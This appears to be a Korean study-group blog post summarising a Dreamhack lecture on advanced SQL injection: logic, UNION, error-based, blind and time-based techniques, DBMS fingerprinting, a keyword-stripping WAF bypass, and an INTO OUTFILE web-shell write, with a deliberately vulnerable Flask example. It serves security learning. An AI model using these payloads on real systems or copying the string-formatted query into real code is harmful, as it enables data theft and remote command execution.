---
title: "[모각코] #5 드림핵 5강 Server-side Advanced - SQL Injection"
categories:
  - Hacking
  - MGK
tags:
  - Hacking
  - MGK
toc: true
toc_sticky: true
---

# SQL Injection Advanced

## SQL Injection 공격 기법

- **Logic**

  -> **논리 연산을 이용한 공격 방법**

  | A    | B    | A && B (and 연산) | A \|\| B (or 연산) |
  | ---- | ---- | ----------------- | ------------------ |
  | 0    | 0    | 0                 | 0                  |
  | 1    | 0    | 0                 | 1                  |
  | 0    | 1    | 0                 | 1                  |
  | 1    | 1    | 1                 | 1                  |

  ex) **or 연산자**

  -> 모든 결과 반환

  ```sql
  SELECT uid
  FROM UserTable
  WHERE username="admin" or 1;
  ```

  

- **Union**

  -> **SELECT 구문의 Union 절을 이용한 공격 방법**

  **=> 데이터베이스 조회 쿼리의 결과가 어플리케이션에 출력되는 경우 사용하기 유용한 공격 기법** 

  * 역할:

    다수의 SELECT 구문의 결과를 결합시키는 행위를 수행

  ex) 

  ```sql
  SELECT * FROM UserTable
  UNION SELECT "DreamHack", "DreamHack PW";
  /*
  +-----------+--------------+
  | username  | password     |
  +-----------+--------------+
  | admin     | admin        |
  | guest     | guest        |
  | DreamHack | DreamHack PW |
  +-----------+--------------+
  3 rows in set (0.01 sec)
  */
  ```

  **=> 원하는 다른 테이블에 접근하거나 원하는 쿼리 결과 데이터를 생성하여 어플리케이션에서 처리되는 데이터를 조작 가능**

  

- **Subquery**

  * 의미: 

    하나의 쿼리 내에 또 다른 쿼리를 사용하는 것

  **=>** **서브 쿼리를 이용하여 메인 쿼리가 접근하는 테이블이 아닌 다른 테이블에 접근 가능**

  **=>** **SELECT 구문이 아닌 구문에서 SQL Injection이 발생하여도 서브 쿼리의 SELECT 구문을 사용하여 테이블의 데이터에 접근**

  

  ex) 

  - **COLUMNS Clause**

  ```sql
  SELECT username, (SELECT "ABCD") FROM users;
  /*
  +----------+-----------------+
  | username | (select "ABCD") |
  +----------+-----------------+
  | admin    | ABCD            |
  | guest    | ABCD            |
  +----------+-----------------+
  2 rows in set (0.00 sec)
  */
  ```

  ※ 컬럼 절에서 사용 시 단일 행(Single row), 단일 컬럼(Singloe Column)의 결과가 반환되도록 하기

  ```sql
  mysql> SELECT username, (SELECT "ABCD" UNION SELECT 1234) FROM users;
  ERROR 1242 (21000): Subquery returns more than 1 row
  mysql> SELECT username, (SELECT "ABCD", 1234) FROM users;
  ERROR 1241 (21000): Operand should contain 1 column(s)
  ```

  

  - **FROM Clause (Inline View)**

  FROM 절에서 사용되는 서브 쿼리 : **Inline View**

  ```
  SELECT * FROM (SELECT *, 1234 FROM users) as u;
  /*
  +----------+------+
  | username | 1234 |
  +----------+------+
  | admin    | 1234 |
  | guest    | 1234 |
  +----------+------+
  2 rows in set (0.00 sec)
  */
  ```

  ※ Inline View에서는 다중 행(Multiple Row), 다중 컬럼(Multiple Column)의 결과를 사용가능

  

  - **WHERE Clause**

  WHERE 절에서 사용 시 조건 검색을 위해 다중 행(Multiple Row)의 결과를 사용

  ```
  SELECT * FROM users 
  WHERE username IN (SELECT "admin" UNION SELECT "guest");
  /*
  +----------+----------+
  | username | password |
  +----------+----------+
  | admin    | admin    |
  | guest    | guest    |
  +----------+----------+
  2 rows in set (0.00 sec)
  */
  ```

- **Error Based**

  **=> 사용자가 임의적으로 에러를 발생시켜 정보를 획득하는 공격 기법**

  * **SQL Injection 취약점 예시**

  ​	-> 아래는 debug 모드가 설정 & 사용자의 입력 데이터가 SQL쿼리에 직접적으로 사용하므로 취약점 발생

  ```sql
  from flask import Flask, request
  import pymysql
  app = Flask(__name__)
  def getConnection():
    return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')
  @app.route('/' , methods=['GET'])
  def index():
    username = request.args.get('username')
    sql = "select username from users where username='%s'" %username
    conn = getConnection()
    curs = conn.cursor(pymysql.cursors.DictCursor)
    curs.execute(sql)
    rows = curs.fetchall()
    conn.close()
    if(rows):
      return "True"
    else:
      return "False"
  app.run(host='0.0.0.0', port=8000, debug=True)
  ```

  ※ 위는 SQL 쿼리 결과의 유무만 판단하며, 결과는 직접적으로 출력되고 있진 않음

  

  * **공격예시**

    ```sql
    SELECT extractvalue(1,concat(0x3a,version()));
    /*
    ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
    */
    ```

    -> 에러 메시지에 중요한 정보가 같이 출력

    **=> extractvalue 함수 원리 이용**

    * extractvalue : 첫번째 인자에 존재하는 xml 데이터에서 두번째 인자의 XPATH 식을 통해 데이터를 추출하는 함수

    ```sql
    mysql> SELECT extractvalue('<a>test</a> <b>abcd</b>', '/a');
    +-----------------------------------------------+
    | extractvalue('<a>test</a> <b>abcd</b>', '/a') |
    +-----------------------------------------------+
    | test                                          |
    +-----------------------------------------------+
    1 row in set (0.00 sec)
    mysql> SELECT extractvalue(1, ':abcd');
    ERROR 1105 (HY000): XPATH syntax error: ':abcd'
    # ":" 로 시작하면 올바르지 않은 XPATH 식
    ```

    * **공격 원리** : **두번째 인자에 올바르지 않은 XPATH 식을 입력하게 되면 올바르지 않은 XPATH 식이라는 에러와 함께 해당 인자가 함께 출력**

      

- **Blind**

  **=> 데이터베이스 조회 후 결과를 직접적으로 확인할 수 없는 경우 사용될 수 있는 공격 기법**

  

  * **조건**

    - **데이터를 비교해 참/거짓을 구분**

      **ex) If Statements**

      ```sql
      # MySQL
      SELECT IF(1=1, True, False);
      /*
      +----------------------+
      | IF(1=1, True, False) |
      +----------------------+
      |                    1 |
      +----------------------+
      1 row in set (0.00 sec)
      */
      # SQLite
      SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END;
      /*
      true
      */
      # MSSQL
      if (SELECT 'test') = 'test' SELECT 1234;
      /*
      Execution time: 0 sec, rows selected: 1, rows affected: 0, absolute service time: 0,17 sec, absolute service time: 0,17 sec
        	(No column name)
      1	1234
      */
      ```

      

    - **참/거짓의 결과에 따른 특별한 응답 생성**

      1. **Application Logic**

      ​		-> **데이터베이스의 결과를 받은 어플리케이션에서 결과 값에 따라 다른 행위를 수행하게 되는 점을 이용해 참과 거짓을 구분하는 방법**

      ```sql
      from flask import Flask, request
      import pymysql
      app = Flask(__name__)
      def getConnection():
        return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')
      @app.route('/' , methods=['GET'])
      def index():
        username = request.args.get('username')
        sql = "select username from users where username='%s'" %username
        conn = getConnection()
        curs = conn.cursor(pymysql.cursors.DictCursor)
        curs.execute(sql)
        rows = curs.fetchall()
        conn.close()
        if(rows[0]['username'] == "admin"):
          return "True"
        else:
          return "False"
      app.run(host='0.0.0.0', port=8000)
      ```

      => username에 의해 SQL Injection이 발생 

      => 데이터베이스의 결과인 username이 admin인 경우에는 사용자에게 "True"가 반환되고, 아닌 경우에는 "False"가 반환

      

      2. **Time Based**

         **-> 시간 지연을 이용해 참/거짓 여부를 판단**

         * **sleep 함수**

         ```sql
         SLEEP(duration)
         /*
         mysql> SELECT SLEEP(1);
         +----------+
         | SLEEP(1) |
         +----------+
         |        0 |
         +----------+
         1 row in set (1.00 sec)
         */
         ```

         - **benchmark 함수**

         -> expr 식을 count 수만큼 실행하며 시간지연

         ```sql
         BENCHMARK(count, expr)
         /*
         mysql> SELECT BENCHMARK(40000000,SHA1(1));
         +-----------------------------+
         | BENCHMARK(40000000,SHA1(1)) |
         +-----------------------------+
         |                           0 |
         +-----------------------------+
         1 row in set (10.78 sec)
         */
         ```

         - **heavy query**

         -> `information_schema.tables`과 같이 많은 수의 데이터가 포함된 테이블을 연산 과정에 포함시켜 시간을 지연

         ```sql
         mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
         +----------+
         | heavy    |
         +----------+
         | 24897088 |
         +----------+
         1 row in set (1.41 sec)
         ```

         

         

## SQL DML 구문에 대한 이해

### SQL DML (Data manipulation language)

**-> 데이터베이스에서 데이터를 조회하거나, 추가/삭제/수정을 수행하는 구문**

- **SELECT**

  **-> 데이터를 조회하는 구문**

  * `FROM` : 데이터를 조회하기 위한 **테이블의 이름**을 입력
  * `WHERE` : 해당 테이블내에 조회하는 **데이터의 조건**을 설정
  * `ORDER BY` : 쿼리의 결과 값들을 **원하는 컬럼을 기준으로 정렬**
  * `LIMIT` : 쿼리의 결과로 **출력될 row의 개수를 또는 Offset을 지정**

  ex) 

  ```sql
  SELECT
      uid, title, boardcontent
  FROM boards
  WHERE boardcontent like '%abc%'
  ORDER BY uid DESC
  LIMIT 5 
  ```

  

- **UPDATE**

  **-> 데이터를 수정하는 구문**

  * `SET`:  **수정할 컬럼과 수정될 데이터를 정의**
  * `WHERE`: **수정할 row를 지정**

  ex) 

  ```sql
  UPDATE boards
      SET boardcontent = "update content 2"
      WHERE title = 'title 1';
  ```

  

- **INSERT**

  **-> 데이터를 추가하기 위한 구문**

  * `VALUE[S]`: **추가될 데이터의 값**을 입력

  ex) 

  ```sql
  INSERT 
      INTO boards (title, boardcontent)
      VALUES ('title 1', 'content 1'), ('title 2', 'content 2');
  ```

  

- **DELETE**

  **-> 데이터를 삭제하는 구문**

  * `WHERE` : 삭제할 데이터의 **row를 지정**

  ex) 

  ```sql
  DELETE FROM boards
      WHERE title = 'title 1';
  ```

  

## Exploit Technique

### 공격 과정

1. **SQL Injection 취약점 발견**

 * **발생여부 확인 방법**
   * HTTP Response Status Code를 통해 오류가 발생하는지 확인
   * DBMS의 오류 메시지를 통해 취약점 가능성 확인
   * 웹 어플리케이션에서 변조된 SQL구문이 실행된 데이터가 반환되는지 확인



2. **구문 예측 / DBMS 정보 획득**

- **사용자의 입력 데이터를 처리하는 구문을 예측**
- **DBMS의 정보를 획득하여 Exploit 작성을 위한 정보를 획득**



3. **Exploit 작성**

- **사용할 공격 기법을 선정** 

  >  데이터베이스의 결과가 그대로 노출된다면 union 또는 subquery구문을 통해 직접적으로 정보를 노출할 수 있는 구문을 사용하거나, 정보가 노출되지 않는다면 Blind SQL Injection을 사용

- **WAF과 같이 SQL Injection을 방어하는 로직 등이 존재할 경우 우회 가능성을 판단**



4. **정보 탈취 및 수정/삭제**

- **시스템 테이블 등을 이용하여 데이터베이스의 정보 등을 획득 & 저장된 데이터를 탈취하거나 수정/삭제 하여 공격의 목적을 달성**





### DBMS Fingerprinting

-> BlackBox 점검에서 SQL Injection이 의심되는 Endpoint를 찾았을 때 DBMS의 종류를 파악 후 공격하는 것이 효율적



* **각 상황별 DBMS를 파악하는 방법**

  * **결과 값이 출력될 때**
    - DMBS 별로 다른 환경 변수 값 출력

  ```sql
  # DBMS 별로 버전을 나타내는 함수 및 데이터는 다릅니다.
  @@version 
  version()
  ```

  

  - **결과 값이 출력되지 않지만 에러가 출력될 때**
    - 에러 메세지를 통해 DBMS 파악

  ```sql
  select 1 union select 1, 2;
  # MySQL => ERROR 1222 (21000): The used SELECT statements have a different number of columns
  (select * from not_exists_table)
  # SQLite => Error: no such table: not_exists_table
  ```

  

  - **결과 값이 출력되지 않을 때**
    - True / False를 확인 가능한 경우
      - Blind로 함수, 조건문을 사용해 테스트

  ```sql
  mid(@@version, 1, 1)='5';
  substr(version(), 1, 1)='P';
  ```

  

  - **출력이 존재하지 않는 경우**
    - Time Based

  ```sql
  # sleep 함수를 지원하지 않는 DBMS도 존재합니다.
  sleep(10)
  pg_sleep(10)
  ```



### System Tables

**-> 시스템 테이블에 담긴 정보를 통해 SQL Injection 취약점을 좀 더 효율적으로 공격**

- **조건**

  - 게시판 서비스에서 boards 테이블에서 `SELECT`구문을 통해 조회 시 SQL Injection이 발생
  - 사용자 정보가 포함되어 있는 유저 테이블, 컬럼 정보 등을 모름

  

- **공격 방법**

  - **시스템 테이블의 정보를 이용**하여 유저 테이블의 이름 및 컬럼 정보를 획득
  - 획득한 테이블, 컬럼 정보로 **유저 테이블에 접근 및 사용자 정보를 획득**할 수 있습니다.



### WAF Bypass(웹 방화벽)

​	**-> WAF또는 특정 키워드를 방어하는 방식은 공격의 리소스를 증가시키지만, 근본적인 취약점은 해결하지 못함**

​	ex) **탐지 시 처리 미흡**

​		-> 악성 키워드 탐지 시 해당 요청을 차단하지 않고 문자열을 변환하는 등의 과정을 거친 후 처리하는 경우 발생할 수 있음

```sql
UNunionION SELselectECT 1,2 --
# => UNION SELECT 1,2 --  
```



### Out Of DBMS

​	-> **DBMS에서 제공하는 특별한 함수 또는 기능 등을 이용해 파일 시스템, 네트워크 심지어 OS 명령어 등에도 접근**

​	ex) **Into outfile**

​		-> `SELECT ... INTO` 형식의 쿼리는 쿼리 결과를 변수나 파일에 쓸 수 있음

​		**=> 파일에 값을 쓸 수 있기 때문에 `secure_file_priv` 값이 올바르게 설정되지 않은 경우 추가적인 공격으로 연계 가능**

```sql
mysql> select '<?=`ls`?>' into outfile '/tmp/a.php';
/*
<?php 
include $_GET['page'].'.php'; // "?page=../../../tmp/a"
*/
```



### DBMS 주의사항

- **권한문제**

  - DBMS 어플리케이션 작동 권한

  - DBMS 계정 권한

    

- **String Compare**

  - Case sensitive

  - space로 끝나는 문자열 비교

    

- **Multiple statement**
